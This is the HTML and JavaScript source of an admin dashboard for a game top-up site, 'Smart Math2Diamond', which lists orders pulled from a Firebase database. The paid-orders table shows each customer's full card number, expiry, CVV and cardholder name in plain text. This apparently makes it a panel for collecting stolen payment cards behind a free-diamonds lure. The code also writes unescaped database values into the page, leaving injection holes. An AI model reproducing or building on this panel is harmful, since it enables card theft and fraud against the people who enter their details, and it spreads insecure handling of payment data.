<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Dashboard | Smart Math2Diamond</title>
    
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>

    <style>
        :root {
            --primary: #ffb700;
            --secondary: #00ff6c;
            --bg-dark: #121212;
            --card-bg: #1e1e1e;
            --text-white: #ffffff;
        }
        body {
            font-family: 'Segoe UI', sans-serif;
            margin: 0; padding: 20px;
            background-color: var(--bg-dark); color: var(--text-white);
        }
        h1 { color: var(--primary); text-align: center; border-bottom: 2px solid #333; padding-bottom: 10px; }
        h2 { color: var(--secondary); margin-top: 30px; }
        .table-container {
            overflow-x: auto;
            background: var(--card-bg);
            border-radius: 8px;
            padding: 15px;
            border: 1px solid #333;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            text-align: left;
        }
        th, td {
            padding: 12px;
            border-bottom: 1px solid #333;
        }
        th { background-color: #1a1a1a; color: var(--primary); }
        tr:hover { background-color: #252525; }
        .btn-done {
            background-color: var(--secondary);
            color: black; border: none; padding: 5px 10px;
            border-radius: 4px; cursor: pointer; font-weight: bold;
        }
        .btn-delete {
            background-color: #ff4a4a;
            color: white; border: none; padding: 5px 10px;
            border-radius: 4px; cursor: pointer; font-weight: bold;
            margin-left: 5px;
        }
        .status-pending { color: #ffb700; font-weight: bold; }
        .status-done { color: var(--secondary); font-weight: bold; }
    </style>
</head>
<body>

    <h1>Admin Dashboard - Orders Management</h1>

    <h2>💰 Paid Top-Up Orders (Bank Card)</h2>
    <div class="table-container">
        <table>
            <thead>
                <tr>
                    <th>Date</th>
                    <th>Player ID</th>
                    <th>Package</th>
                    <th>Price</th>
                    <th>Card Details</th>
                    <th>Status</th>
                    <th>Action</th>
                </tr>
            </thead>
            <tbody id="paid-orders-table">
                <tr><td colspan="7" style="text-align:center;">Loading Paid Orders...</td></tr>
            </tbody>
        </table>
    </div>

    <h2>💎 Free Top-Up Orders (Earned Coins)</h2>
    <div class="table-container">
        <table>
            <thead>
                <tr>
                    <th>Date</th>
                    <th>Player ID</th>
                    <th>Package</th>
                    <th>Coins Spent</th>
                    <th>WhatsApp</th>
                    <th>Status</th>
                    <th>Action</th>
                </tr>
            </thead>
            <tbody id="free-orders-table">
                <tr><td colspan="7" style="text-align:center;">Loading Free Orders...</td></tr>
            </tbody>
        </table>
    </div>

    <script>
        // --- Firebase Setup (ඔයාගේම Config එක) ---
        const firebaseConfig = {
            apiKey: "AIzaSyC7tt9khXdXwOf-dlrqXK0estg9_yF9sLw",
            authDomain: "smart-math-2-diamond-b7c73.firebaseapp.com",
            projectId: "smart-math-2-diamond-b7c73",
            storageBucket: "smart-math-2-diamond-b7c73.firebasestorage.app",
            messagingSenderId: "731094601612",
            appId: "1:731094601612:web:3671bd485d353c1c7610a9",
            databaseURL: "https://smart-math-2-diamond-b7c73-default-rtdb.firebaseio.com/"
        };

        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        // 1. Paid Orders ලෝඩ් කිරීම
        database.ref('paid_topups').on('value', (snapshot) => {
            const tableBody = document.getElementById('paid-orders-table');
            tableBody.innerHTML = '';
            
            if (!snapshot.exists()) {
                tableBody.innerHTML = '<tr><td colspan="7" style="text-align:center;">No Paid Orders Yet.</td></tr>';
                return;
            }

            snapshot.forEach((childSnapshot) => {
                const orderId = childSnapshot.key;
                const data = childSnapshot.val();
                
                const tr = document.createElement('tr');
                tr.innerHTML = `
                    <td>${data.date}</td>
                    <td>${data.playerId}</td>
                    <td>${data.packageName}</td>
                    <td>LKR ${data.price}</td>
                    <td>
                        No: ${data.cardNum}<br>
                        Exp: ${data.cardExpiry} | CVV: ${data.cardCVV}<br>
                        Name: ${data.cardHolder}
                    </td>
                    <td class="${data.status === 'Done' ? 'status-done' : 'status-pending'}">${data.status}</td>
                    <td>
                        <button class="btn-done" onclick="updateStatus('paid_topups', '${orderId}', 'Done')">Mark Done</button>
                        <button class="btn-delete" onclick="deleteOrder('paid_topups', '${orderId}')">Delete</button>
                    </td>
                `;
                tableBody.appendChild(tr);
            });
        });

        // 2. Free Orders ලෝඩ් කිරීම
        database.ref('free_topups').on('value', (snapshot) => {
            const tableBody = document.getElementById('free-orders-table');
            tableBody.innerHTML = '';
            
            if (!snapshot.exists()) {
                tableBody.innerHTML = '<tr><td colspan="7" style="text-align:center;">No Free Orders Yet.</td></tr>';
                return;
            }

            snapshot.forEach((childSnapshot) => {
                const orderId = childSnapshot.key;
                const data = childSnapshot.val();
                
                const tr = document.createElement('tr');
                tr.innerHTML = `
                    <td>${data.date}</td>
                    <td>${data.playerId}</td>
                    <td>${data.packageName}</td>
                    <td>${data.coinsRedeemed}</td>
                    <td>${data.whatsapp}</td>
                    <td class="${data.status === 'Done' ? 'status-done' : 'status-pending'}">${data.status}</td>
                    <td>
                        <button class="btn-done" onclick="updateStatus('free_topups', '${orderId}', 'Done')">Mark Done</button>
                        <button class="btn-delete" onclick="deleteOrder('free_topups', '${orderId}')">Delete</button>
                    </td>
                `;
                tableBody.appendChild(tr);
            });
        });

        // Status එක වෙනස් කිරීම (Done කිරීම)
        function updateStatus(path, orderId, newStatus) {
            database.ref(`${path}/${orderId}`).update({ status: newStatus });
        }

        // Order එක මකා දැමීම
        function deleteOrder(path, orderId) {
            if(confirm('Are you sure you want to delete this order?')) {
                database.ref(`${path}/${orderId}`).remove();
            }
        }
    </script>
</body>
</html>
